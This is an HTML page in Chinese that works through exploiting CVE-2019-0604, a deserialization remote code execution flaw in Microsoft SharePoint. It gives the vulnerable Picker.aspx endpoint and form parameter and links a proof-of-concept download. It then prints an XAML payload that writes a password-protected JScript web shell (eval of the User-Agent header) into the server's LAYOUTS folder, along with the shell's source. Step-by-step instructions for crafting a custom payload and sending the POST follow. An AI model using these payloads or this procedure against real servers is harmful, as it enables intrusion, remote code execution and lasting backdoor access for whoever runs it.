<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs1773D91F{text-align:left;margin:2pt 0pt 2pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X0824ee5abfdd43edcc4bfd6baee04e893df7123"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-0604</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Microsoft SharePoint </span><span class="csECDA2D3">远程代码执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Microsoft SharePoint</span><span class="cs9C1B1871">是美国微软（</span><span class="cs8926E06">Microsoft</span><span class="cs9C1B1871">）公司的一套企业业务协作平台。该平台用于对业务信息进行整合，并能够共享工作、与他人协同工作、组织项目和工作组、搜索人员和信息。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Microsoft SharePoint </span><span class="cs9C1B1871">远程代码执行漏洞（</span><span class="cs8926E06">CVE-2019-0594</span><span class="cs9C1B1871">、</span><span class="cs8926E06">CVE-2019-0604</span><span class="cs9C1B1871">，高危）：</span><span class="cs8926E06">Microsoft SharePoint</span><span class="cs9C1B1871">软件无法检查应用程序包源标记时触发该漏洞。攻击者可在</span><span class="cs8926E06">SharePoint</span><span class="cs9C1B1871">应用程序池和</span><span class="cs8926E06">SharePoint</span><span class="cs9C1B1871">服务器中执行任意代码。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Microsoft SharePoint Enterprise Server 2016<br/>SharePoint Foundation 2013 SP1<br/>harePoint Server 2010 SP2<br/>SharePoint Server 2019</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">ItemPicker Web </span><span class="cs9C1B1871">控件实际上从来没有在一个</span><span class="cs8926E06"> .aspx </span><span class="cs9C1B1871">页面中使用过。但是看看它基类型的用法，</span><span class="cs8926E06">EntityEditorWithPicker</span><span class="cs9C1B1871">，说明在</span><span class="cs8926E06"> /_layouts/15/Picker.aspx </span><span class="cs9C1B1871">应该有一个</span><span class="cs8926E06"> Picker.aspx </span><span class="cs9C1B1871">文件使用了它。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">该页面要求使用选择器对话框的类型通过</span><span class="cs8926E06"> URL </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> PickerDialogType </span><span class="cs9C1B1871">参数的形式提供。在这里，可以使用以下两种</span><span class="cs8926E06"> ItemPickerDialog </span><span class="cs9C1B1871">类型中的任何一种：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&middot; Microsoft.SharePoint.WebControls.ItemPickerDialog in &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft.SharePoint.dll</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&middot; Microsoft.SharePoint.Portal.WebControls.ItemPickerDialog in Microsoft.SharePoint.Portal.dll</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">利用第一种</span><span class="cs8926E06"> PickerDialogType </span><span class="cs9C1B1871">类型</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当表单提交</span><span class="cs8926E06"> ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData </span><span class="cs9C1B1871">的值以</span><span class="cs8926E06"> &ldquo;__&rdquo; </span><span class="cs9C1B1871">为开头时</span><span class="cs8926E06">(</span><span class="cs9C1B1871">类似于</span><span class="cs8926E06">&ldquo;_dummy&rdquo;)</span><span class="cs9C1B1871">，</span></p><p class="cs40DD2BC9"><span class="cs8926E06">EntityInstanceIdEncoder.DecodeEntityInstanceId(string) </span><span class="cs9C1B1871">处的断点将显示以下情况：而调用另外一种</span><span class="cs8926E06"> ItemPickerDialog </span><span class="cs9C1B1871">类型时，函数调用栈只是在最上面的两个有所不同。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这表明</span><span class="cs8926E06"> ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData </span><span class="cs9C1B1871">的数据最终出现在了</span><span class="cs8926E06"> EntityInstanceIdEncoder.DecodeEntityInstanceId(string) </span><span class="cs9C1B1871">中。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">剩下的只需要拷贝实例</span><span class="cs8926E06"> ID </span><span class="cs9C1B1871">和构造一个</span><span class="cs8926E06"> XmlSerializer </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">就可以了。</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">完整</span><span class="cs5BEC2C28">POST</span><span class="csE3F655E4">以及具体参数如下：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">URL</span><span class="cs9C1B1871">：</span><span class="cs9FB05234">/Picker.aspx?PickerDialogType=</span><span class="cs7FFD2630">控件的程序集限定名</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">参数：</span><span class="cs8926E06"> </span><span class="cs9FB05234">ctl00%24PlaceHolderDialogBodySection%24ctl05%24hiddenSpanData=payload</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">实际上还需访问</span><span class="cs8926E06">Picker.aspx</span><span class="cs9C1B1871">附带的其它参数，测试我不附带其它参数时提交表单是失败的。</span></p><h2 class="cs868C439D">
			<a name="poc"><span class="csB2D98684">poc</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://download.0-sec.org/download/CVE-2019-0604.zip</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">解说</span><span class="cs5BEC2C28">k8gege</span><span class="csE3F655E4">的</span><span class="cs5BEC2C28">cve-2019-0604-exp.py</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">老实说</span><span class="cs8926E06">k8gege</span><span class="cs9C1B1871">的</span><span class="cs8926E06">py</span><span class="cs9C1B1871">脚本有点花哨，一大堆的</span><span class="cs8926E06">16</span><span class="cs9C1B1871">进制字符串，分成</span><span class="cs8926E06"> payload1,2,3, </span><span class="cs9C1B1871">好坏呀</span></p><p class="cs40DD2BC9"><span class="cs8926E06">python</span><span class="cs9C1B1871">脚本远程</span><span class="cs8926E06">post</span><span class="cs9C1B1871">的</span><span class="cs8926E06">payload,</span><span class="cs9C1B1871">反序列化之后是一个</span><span class="cs8926E06">xml</span><span class="cs9C1B1871">数据体</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;ResourceDictionary</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">xmlns:System=&quot;clr-namespace:System;assembly=mscorlib&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">xmlns:Diag=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;ObjectDataProvider x:Key=&quot;LaunchCalch&quot; ObjectType=&quot;{x:Type Diag:Process}&quot; MethodName=&quot;Start&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;ObjectDataProvider.MethodParameters&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;System:String&gt;cmd&lt;/System:String&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;System:String&gt;/c echo ^&amp;lt;%@ Page Language=&quot;Jscript&quot; %^&gt;^&amp;lt;%var pwd=&quot;tom&quot;;var uastr=Request.UserAgent;if (uastr.Substring(0, uastr.IndexOf(&quot;===&quot;))== pwd) {var code=uastr.Replace(pwd+&quot;===&quot;,&quot;&quot;);eval(code,&quot;unsafe&quot;); };%^&gt; &gt; &quot;%CommonProgramFiles%\\Microsoft Shared\\Web Server Extensions\\15\\TEMPLATE\\LAYOUTS\\ua.aspx&quot; &lt;/System:String&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/ObjectDataProvider.MethodParameters&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/ObjectDataProvider&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/ResourceDictionary&gt;</span></p><p class="cs40DD2BC9"><span class="cs8926E06"><a class="cs508254C" href="https://github.com/boxhg/CVE-2019-0604/blob/master/Capture3.PNG"><span class="cs4B51D5E4">Image Pyaload Maker</span></a></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">即远程执行</span><span class="cs8926E06">echo</span><span class="cs9C1B1871">命令，向服务器</span><span class="cs8926E06">SharePoint</span><span class="cs9C1B1871">的模板</span><span class="cs8926E06">layouts</span><span class="cs9C1B1871">目录写了一个</span><span class="cs8926E06">up.aspx</span><span class="cs9C1B1871">文件</span></p><p class="cs3A447A38"><span class="cs9FB05234">cmd /c echo ^&amp;lt;%@ Page Language=&quot;Jscript&quot; %^&gt;^&amp;lt;%var pwd=&quot;tom&quot;;var uastr=Request.UserAgent;if (uastr.Substring(0, uastr.IndexOf(&quot;===&quot;))== pwd) {var code=uastr.Replace(pwd+&quot;===&quot;,&quot;&quot;);eval(code,&quot;unsafe&quot;); };%^&gt; &gt; &quot;%CommonProgramFiles%\\Microsoft Shared\\Web Server Extensions\\15\\TEMPLATE\\LAYOUTS\\ua.aspx&quot; </span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">生成了一个</span><span class="cs8926E06">K8</span><span class="cs9C1B1871">飞刀专用</span><span class="cs8926E06">UA</span><span class="cs9C1B1871">一句话木马</span><span class="cs8926E06">.asxp</span><span class="cs9C1B1871">，</span><span class="cs8926E06">OK</span><span class="cs9C1B1871">，</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">到手</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;%@ Page Language=&quot;Jscript&quot; %&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;%</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var pwd=&quot;tom&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var uastr=Request.UserAgent;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if (uastr.Substring(0, uastr.IndexOf(&quot;===&quot;))== pwd) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var code=uastr.Replace(pwd+&quot;===&quot;,&quot;&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;eval(code,&quot;unsafe&quot;); </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">%&gt;</span></p><h2 class="cs868C439D">
			<a name="结合k8的poc构造我们自己的payload"><span class="cs83F14626">结合</span><span class="csB2D98684">k8</span><span class="cs83F14626">的</span><span class="csB2D98684">poc</span><span class="cs83F14626">构造我们自己的</span><span class="csB2D98684">payload</span></a></h2>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">1</span><span class="cs9C1B1871">、</span><span class="cs8926E06"> </span><span class="cs9C1B1871">下载编译好的程序，解压运行</span><span class="cs8926E06">CVE20190604Forms.exe</span></li><li class="cs24C36B3"><span class="cs8926E06">2</span><span class="cs9C1B1871">、在</span><span class="cs8926E06">Cmd</span><span class="cs9C1B1871">文本框加输入命令，点击</span><span class="cs8926E06">&ldquo;Update XML&rdquo;</span><span class="cs9C1B1871">按钮，会将命令合并为</span><span class="cs8926E06">xml</span></li><li class="cs24C36B3"><span class="cs8926E06">3</span><span class="cs9C1B1871">、点击</span><span class="cs8926E06">&ldquo;EncodeEntity&rdquo;</span><span class="cs9C1B1871">，程序将</span><span class="cs8926E06">xml</span><span class="cs9C1B1871">字符串序列化为对象，并触发执行</span><span class="cs8926E06">payload, </span><span class="cs9C1B1871">序列化后的字符串显示在</span><span class="cs8926E06">&quot;payload&quot;</span><span class="cs9C1B1871">文本框中</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">__cp087135009700370047005600d600e2004400160047001600e20035005600270067009600360056003700e2009400e600470056002700e6001600c600e2005400870007001600e60046005600460075002700160......</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">4</span><span class="cs9C1B1871">、</span><span class="cs8926E06"> &quot;__cp....&quot; </span><span class="cs9C1B1871">这些字符串就是</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">了，复制到</span><span class="cs8926E06"> cve-2019-0604-exp.py</span><span class="cs9C1B1871">中，修改替换掉原来</span><span class="cs8926E06">k8</span><span class="cs9C1B1871">的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">，</span></li><li class="cs24C36B3"><span class="cs8926E06">5</span><span class="cs9C1B1871">、向</span><span class="cs8926E06">Picker.aspx</span><span class="cs9C1B1871">提交</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">时，需要附带的其它参数，可通过</span><span class="cs8926E06">Burp</span><span class="cs9C1B1871">代理工具，获取一下相关的参数，再将</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">值传给</span><span class="cs8926E06"> ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">...</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">values = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;__REQUESTDIGEST&#39;:YOUR_REQUESTDIGEST,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;__EVENTTARGET&#39;:&#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;__EVENTARGUMENT&#39;:&#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;__spPickerHasReturnValue&#39;:&#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;__spPickerReturnValueHolder&#39;:&#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;__VIEWSTATE&#39;:YOUR_VIEWSTATE,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;__VIEWSTATEGENERATOR&#39;:&#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;ctl00$PlaceHolderDialogBodySection$ctl07$queryTextBox&#39;:&#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData&#39;:**YOUR_PayloadData**,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;ctl00$PlaceHolderDialogBodySection$ctl05$OriginalEntities&#39;:&#39;&lt;Entities /&gt;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;ctl00$PlaceHolderDialogBodySection$ctl05$HiddenEntityKey&#39;:&#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;ctl00$PlaceHolderDialogBodySection$ctl05$HiddenEntityDisplayText&#39;:&#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;ctl00$PlaceHolderDialogBodySection$ctl05$downlevelTextBox&#39;:&#39;&amp;#160;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;__CALLBACKID&#39;:&#39;ctl00$PlaceHolderDialogBodySection$ctl07&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;__CALLBACKPARAM&#39;:&#39;;#;#11;#;#;#&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;__EVENTVALIDATION&#39;:YOUR_EVENTVALIDATION</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">data = urllib.urlencode(values)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">...</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs1773D91F"><span class="cs8926E06">6</span><span class="cs9C1B1871">、运行</span><span class="cs8926E06">py</span><span class="cs9C1B1871">脚本</span><span class="cs8926E06">, good luck!!!</span></li></ul>
		<h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://github.com/boxhg/CVE-2019-0604/</span></p></body>
</html>
